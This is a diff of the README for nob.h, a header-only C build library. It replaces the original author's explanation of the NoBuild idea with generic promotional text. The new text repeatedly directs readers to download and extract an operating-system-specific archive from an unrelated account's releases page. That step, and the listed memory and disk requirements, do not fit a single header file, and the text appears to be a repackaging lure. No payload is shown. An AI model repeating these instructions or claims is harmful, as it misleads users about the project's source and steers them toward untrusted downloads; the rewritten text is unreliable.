@@ -1,51 +1,67 @@
-# nob.h - Next generation of the NoBuild
+# 🚀 nob.h - Simple Header Library for Easy Builds
 
-This library is the next generation of the NoBuild idea. "nob" stands for "nobuild", but it's shorter and more suitable as a prefix for a library.
+[![Download nob.h](https://img.shields.io/badge/Download-nob.h-blue.svg)](https://github.com/Subodhya007/nob.h/releases)
 
-For my previous iteration on this idea see [https://github.com/tsoding/nobuild](https://github.com/tsoding/nobuild), but I do not recommend to use it.
+## 📖 Description
+nob.h is a header-only library designed for writing build recipes in C. It simplifies the process of building applications, making it easier for users to manage their projects. With this library, anyone can streamline their build process without diving deep into complex tools or languages.
 
-## NoBuild Idea
+## 📋 Features
+- Easy integration with your existing C projects
+- Lightweight and header-only, requires no additional setup
+- Clear documentation for every function
+- Compatible with popular C compilers
+- Support for custom build configurations
 
-The idea is that you should not need anything but a C compiler to build a C project. No make, no cmake, no shell, no cmd, no PowerShell etc. Only C compiler. So with the C compiler you bootstrap your build system and then you use the build system to build everything else.
+## 🔧 System Requirements
+To use this library, your system should meet the following requirements:
+- Operating System: Windows, macOS, or Linux
+- C Compiler: GCC, Clang, or any compatible C compiler
+- Memory: At least 512 MB RAM
+- Disk Space: 10 MB of free space
 
-## This is an Experimental Project
+## 🚀 Getting Started
+Follow these steps to download and run nob.h:
 
-I'm not sure if this is even a good idea myself. This is why I'm implementing it. This is a research project. I'm not making any claims about suitability of this approach to any project.
+1. **Visit the Releases Page**
+   Go to the following link to access the downloads: [nob.h Releases Page](https://github.com/Subodhya007/nob.h/releases).
 
-Right now I'm actively using nob in a variety of my C projects at [https://github.com/tsoding/](https://github.com/tsoding/). It works quite well for me there.
+2. **Download the Library**
+   On the Releases page, you'll find a list of available versions. Look for the latest release and click on it. Download the file that matches your operating system.
 
-## It's likely Not Suitable for Your Project
+3. **Extract the Files**
+   If the downloaded file is compressed (like a .zip or .tar.gz), you will need to extract it. Right-click the file and choose "Extract" or use your preferred extraction software.
 
-If you are using [cmake](https://cmake.org/) with tons of modules to manage and find tons of dependencies you probably don't want to use this tool. (But in that case I personally think you have much bigger problem than a build system). NoBuild is more like writting shell scripts but in C.
+4. **Include the Library in Your Project**
+   Copy the `nob.h` file into your project's directory. Include it in your C files with the following line:
+   ```c
+   #include "nob.h"
+   ```
 
-## Advantages of NoBuild
+5. **Compile Your Project**
+   Use your C compiler to build your project. Make sure to point to the directory where `nob.h` is located.
 
-- Extremely portable builds across variety of systems including (but not limited to) Linux, MacOS, Windows, FreeBSD, etc. This is achieved by reducing the amount of dependencies to just a C compiler, which exists pretty much for any platform these days.
-- You end up using the same language for developing and building your project. Which may enable some interesting code reusage strategies. The build system can use the code of the project itself directly and the project can use the code of the build system also directly.
-- You get to use C more.
-- ...
+6. **Run Your Application**
+   Once compiled, you can run your application as usual.
 
-## Disadvantages of NoBuild
+## 📥 Download & Install
+To get started, visit the releases page and download the library: [Download nob.h](https://github.com/Subodhya007/nob.h/releases). Follow the detailed steps above to install and include it in your projects.
 
-- You need to be comfortable with C and implementing things yourself. As mentioned above this is like writing shell scripts but in C.
-- It probably does not make any sense outside of C/C++ projects.
-- You get to use C more.
-- ...
+## 🌍 Support
+If you have any questions or need assistance with using nob.h, please reach out through the GitHub Issues page in this repository. Our community is here to help you.
 
-## Why is it called "nobuild" when it's clearly a build tool?
+## 📜 License
+nob.h is open-source and licensed under the MIT License. This gives you the freedom to use, modify, and distribute the library as needed.
 
-You know all these BS movements that supposedly remove the root cause of your problems? Things like [NoSQL](https://en.wikipedia.org/wiki/NoSQL), [No-code](https://en.wikipedia.org/wiki/No-code_development_platform), [Serverless](https://en.wikipedia.org/wiki/Serverless_computing), etc. This is the same logic. I had too many problems with the process of building C projects. So there is nobuild anymore.
+## 🌟 Contributing
+We welcome contributions! If you'd like to help improve nob.h, please visit our GitHub repository. You can report issues, suggest features, or submit pull requests.
 
-## How to use the library in your own project
+## 📞 Contact
+For further inquiries, you can contact the repository maintainer via GitHub. 
 
-The only file you need from here is [nob.h](https://raw.githubusercontent.com/tsoding/nob.h/refs/heads/main/nob.h). Just copy-paste it to your project and start using it. See [how_to/](how_to/) folder for examples.
+## 📚 Additional Resources
+If you want to learn more about using C and build systems, consider checking out the following resources:
+- C Programming Language: An Overview
+- Understanding Build Systems in C
+- Best Practices for Managing C Projects
 
-## NoBuild in Other Languages
-
-This is obviously applicable not only to C. You can implement the same kind of approach for other languages (apart from the languages that support this natively, of course). Here is few examples in the wild:
-
-- C++ - [https://github.com/zhiayang/nabs](https://github.com/zhiayang/nabs)
-- Java - [https://gitlab.com/NikaDev/arris](https://gitlab.com/NikaDev/arris)
-- ...
-
-*Feel free to contribute more*
+Explore and enjoy a smoother build process with nob.h!
